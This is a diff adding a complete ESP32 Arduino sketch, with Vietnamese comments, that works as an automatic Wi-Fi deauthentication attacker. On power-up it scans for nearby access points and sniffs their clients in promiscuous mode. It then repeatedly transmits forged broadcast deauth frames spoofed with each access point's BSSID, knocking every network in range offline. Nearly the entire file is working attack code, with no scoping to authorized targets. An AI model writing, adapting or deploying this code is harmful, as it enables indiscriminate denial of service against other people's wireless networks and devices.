@@ -1,0 +1,248 @@
+#include <WiFi.h>
+#include "esp_wifi.h"
+
+// --- CẤU HÌNH NÚT BẤM (Dùng chân 6 để tạm dừng/chạy lại nếu muốn) ---
+#define BTN_SELECT 6
+
+volatile bool isRunning = true;  // Cắm vào là tự động chạy luôn
+unsigned long lastSelectTime = 0;
+
+// --- CẤU HÌNH WI-FI SNIFFER & DEAUTH ---
+#define MAX_TARGETS 8          
+#define MAX_CLIENTS_PER_TARGET 4 
+#define BURST_COUNT 2          
+#define PACKET_DELAY 500       
+
+struct Target {
+  uint8_t bssid[6];
+  int channel;
+  char ssid[33];
+  int rssi;
+  uint8_t clients[MAX_CLIENTS_PER_TARGET][6];
+  int clientCount;
+};
+
+Target targets[MAX_TARGETS];
+volatile int targetCount = 0;
+volatile bool isScanningAsync = false; 
+
+struct AnalyzedPacket {
+  uint8_t type;         
+  uint8_t subtype;      
+  uint8_t addr1[6];     
+  uint8_t addr2[6];     
+  uint8_t addr3[6];     
+  int rssi;             
+};
+
+#define RING_BUFFER_SIZE 32 
+AnalyzedPacket packetBuffer[RING_BUFFER_SIZE];
+volatile int bufHead = 0;
+volatile int bufTail = 0;
+portMUX_TYPE bufferMux = portMUX_INITIALIZER_UNLOCKED;
+portMUX_TYPE targetMux = portMUX_INITIALIZER_UNLOCKED;
+
+uint8_t deauthBroadcastPacket[26] = { 
+  0xC0, 0x00, 
+  0x3A, 0x01, 
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+  0x70, 0x01,                         
+  0x07, 0x00                          
+};
+
+bool isValidMac(const uint8_t *mac) {
+    if (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF && mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF) return false;
+    if (mac[0] == 0x00 && mac[1] == 0x00 && mac[2] == 0x00 && mac[3] == 0x00 && mac[4] == 0x00 && mac[5] == 0x00) return false;
+    if (mac[0] & 0x01) return false; 
+    return true;
+}
+
+void IRAM_ATTR promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!isRunning || buf == nullptr) return;
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint16_t packetLen = pkt->rx_ctrl.sig_len;
+    if (packetLen < 24) return;
+
+    uint8_t *payload = pkt->payload;
+    AnalyzedPacket tempPkt;
+    tempPkt.type = (payload[0] >> 2) & 0x03;       
+    tempPkt.subtype = (payload[0] >> 4) & 0x0F;    
+    tempPkt.rssi = pkt->rx_ctrl.rssi;
+    
+    memcpy(tempPkt.addr1, &payload[4], 6);
+    memcpy(tempPkt.addr2, &payload[10], 6);
+    memcpy(tempPkt.addr3, &payload[16], 6);
+
+    portENTER_CRITICAL_ISR(&bufferMux);
+    int nextHead = (bufHead + 1) % RING_BUFFER_SIZE;
+    if (nextHead != bufTail) {
+        packetBuffer[bufHead] = tempPkt;
+        bufHead = nextHead;
+    }
+    portEXIT_CRITICAL_ISR(&bufferMux);
+}
+
+void startAsyncScan() {
+  if (!isRunning) return;
+  int scanStatus = WiFi.scanComplete();
+  if (scanStatus == WIFI_SCAN_RUNNING) return;
+  if (scanStatus >= 0) WiFi.scanDelete(); 
+
+  esp_wifi_set_promiscuous(false);
+  WiFi.scanNetworks(true, true, false, 120); 
+  isScanningAsync = true;
+}
+
+void initWiFiMode() {
+  WiFi.mode(WIFI_MODE_STA);
+  WiFi.disconnect(false);
+  delay(100);
+  
+  portENTER_CRITICAL(&bufferMux);
+  bufHead = 0;
+  bufTail = 0;
+  portEXIT_CRITICAL(&bufferMux);
+
+  if (esp_wifi_set_promiscuous(true) == ESP_OK) {
+      esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
+  }
+  startAsyncScan();
+  Serial.println("[+] Khởi chạy: WIFI TOOL (Không màn hình)");
+}
+
+void setup() {
+  Serial.begin(115200);
+  pinMode(BTN_SELECT, INPUT_PULLUP);
+
+  isRunning = true;
+  initWiFiMode();
+}
+
+void loop() {
+  unsigned long currentMillis = millis();
+
+  if (digitalRead(BTN_SELECT) == LOW) {
+    if (currentMillis - lastSelectTime > 400) {
+      isRunning = !isRunning; 
+      if (isRunning) {
+        initWiFiMode();
+      } else {
+        esp_wifi_set_promiscuous(false);
+        WiFi.scanDelete();
+        WiFi.mode(WIFI_OFF);
+        targetCount = 0;
+        isScanningAsync = false;
+        Serial.println("[-] Đã tạm dừng hoạt động.");
+      }
+      lastSelectTime = currentMillis;
+    }
+  }
+
+  if (!isRunning) {
+    delay(100);
+    return;
+  }
+
+  int processLimit = 10; 
+  while (processLimit > 0 && isRunning) {
+    portENTER_CRITICAL(&bufferMux);
+    if (bufTail == bufHead) {
+      portEXIT_CRITICAL(&bufferMux);
+      break;
+    }
+    AnalyzedPacket p = packetBuffer[bufTail];
+    bufTail = (bufTail + 1) % RING_BUFFER_SIZE;
+    portEXIT_CRITICAL(&bufferMux);
+    
+    portENTER_CRITICAL(&targetMux);
+    if (targetCount > 0) {
+        for (int i = 0; i < targetCount; i++) {
+            if (memcmp(p.addr3, targets[i].bssid, 6) == 0 || memcmp(p.addr1, targets[i].bssid, 6) == 0) {
+                const uint8_t *potentialClient = nullptr;
+                if (memcmp(p.addr1, targets[i].bssid, 6) != 0 && isValidMac(p.addr1)) {
+                    potentialClient = p.addr1;
+                } else if (memcmp(p.addr2, targets[i].bssid, 6) != 0 && isValidMac(p.addr2)) {
+                    potentialClient = p.addr2;
+                }
+
+                if (potentialClient != nullptr) {
+                    bool exists = false;
+                    for (int c = 0; c < targets[i].clientCount; c++) {
+                      if (memcmp(targets[i].clients[c], potentialClient, 6) == 0) {
+                          exists = true;
+                          break;
+                      }
+                    }
+                    if (!exists && targets[i].clientCount < MAX_CLIENTS_PER_TARGET) {
+                        memcpy(targets[i].clients[targets[i].clientCount], potentialClient, 6);
+                        targets[i].clientCount++;
+                    }
+                }
+            }
+        }
+    }
+    portEXIT_CRITICAL(&targetMux);
+    processLimit--;
+  }
+
+  int scanStatus = WiFi.scanComplete();
+  if (scanStatus >= 0 && isRunning) {
+    int foundCount = (scanStatus > 0) ? scanStatus : 0;
+    
+    portENTER_CRITICAL(&targetMux);
+    memset(targets, 0, sizeof(targets));
+    targetCount = (foundCount < MAX_TARGETS) ? foundCount : MAX_TARGETS;
+    
+    if (targetCount > 0) {
+      for (int i = 0; i < targetCount; i++) {
+        targets[i].channel = WiFi.channel(i);
+        memcpy(targets[i].bssid, WiFi.BSSID(i), 6);
+        String ssidStr = WiFi.SSID(i);
+        if (ssidStr.length() == 0) ssidStr = "<Hidden>";
+        ssidStr.toCharArray(targets[i].ssid, 33);
+        targets[i].clientCount = 0;
+      }
+    }
+    portEXIT_CRITICAL(&targetMux);
+
+    WiFi.scanDelete();
+    if (isRunning) {
+      esp_wifi_set_promiscuous(true);
+      esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
+    }
+    isScanningAsync = false;
+  }
+
+  if (!isScanningAsync && targetCount == 0 && isRunning) {
+    startAsyncScan();
+  }
+
+  portENTER_CRITICAL(&targetMux);
+  int currentTargets = targetCount;
+  Target localTargets[MAX_TARGETS];
+  if (currentTargets > 0) {
+    memcpy(localTargets, targets, sizeof(Target) * currentTargets);
+  }
+  portEXIT_CRITICAL(&targetMux);
+
+  if (currentTargets > 0 && !isScanningAsync) {
+    for (int t = 0; t < currentTargets; t++) {
+      if (!isRunning) break;
+      esp_wifi_set_channel(localTargets[t].channel, WIFI_SECOND_CHAN_NONE);
+      
+      memcpy(&deauthBroadcastPacket[10], localTargets[t].bssid, 6); 
+      memcpy(&deauthBroadcastPacket[16], localTargets[t].bssid, 6); 
+      
+      for (int i = 0; i < BURST_COUNT; i++) {
+        if (!isRunning) break; 
+        esp_wifi_80211_tx(WIFI_IF_STA, deauthBroadcastPacket, sizeof(deauthBroadcastPacket), false);
+        delayMicroseconds(PACKET_DELAY); 
+      }
+    }
+  }
+
+  yield();
+  delay(30);
+}
